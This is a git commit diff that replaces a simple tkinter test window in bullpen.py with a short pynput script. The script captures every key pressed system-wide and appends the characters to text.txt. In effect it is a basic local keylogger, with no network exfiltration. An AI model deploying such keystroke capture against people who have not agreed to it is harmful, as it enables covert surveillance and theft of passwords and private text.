9672fe1242a1062190c8b4607436c78ac939db08
NatsukiOgawa <ogawanatsuki19960701@gmail.com>
2020-02-08 19:38:28 +0900

    2020年02月08日19時38分28秒

--- bullpen.py
+++ bullpen.py
@@ -1,33 +1,32 @@
-import tkinter
-from tkinter import ttk
-from tkinter import N, E, W, S
+from pynput.keyboard import Key, Listener
 
+FILE_NAME = 'text.txt'
+out = []
 
-def conversion():
-    #実際にはここでt1を元に複雑な処理を行う
-    t2 = t1.get() + 0
+def on_press(key):
+    try:
+        char = key.char
+    except:
+        #char = key
+        char = ''
+    finally:
+        out.append(char)
+def on_release(key):
+    char = ''
+    out.append(char)
+    pass
 
+def shuffle(out):
+    import random
+    # random.shuffle(out)
 
-root = tkinter.Tk()
-root.title('test')
+if __name__ == '__main__':
+    try:
+        with Listener(on_press=on_press, on_release=on_release) as listener:
+            listener.join()
+    except:
+        pass
+    shuffle(out)
 
-frame1 = tkinter.ttk.Frame(root)
-label1 = tkinter.ttk.Label(frame1, text = 'test')
-
-t1 = tkinter.StringVar()
-t2 = tkinter.StringVar()
-
-entry1 = ttk.Entry(frame1, textvariable = t1)
-button1 = ttk.Button(frame1, text = 'OK' , command = conversion )
-
-entry2 = ttk.Entry(frame1, textvariable = t2)
-
-frame1.grid(row=0, column=0, sticky=(N,E,S,W))
-label1.grid(row=1, column=1, sticky=E)
-entry1.grid(row=1, column=2, sticky=W)
-button1.grid(row=2, column=2, sticky=W)
-
-for child in frame1.winfo_children():
-    child.grid_configure(padx=5, pady=5)
-
-root.mainloop()
+    with open(FILE_NAME, mode='a') as f:
+        f.write(''.join(out))
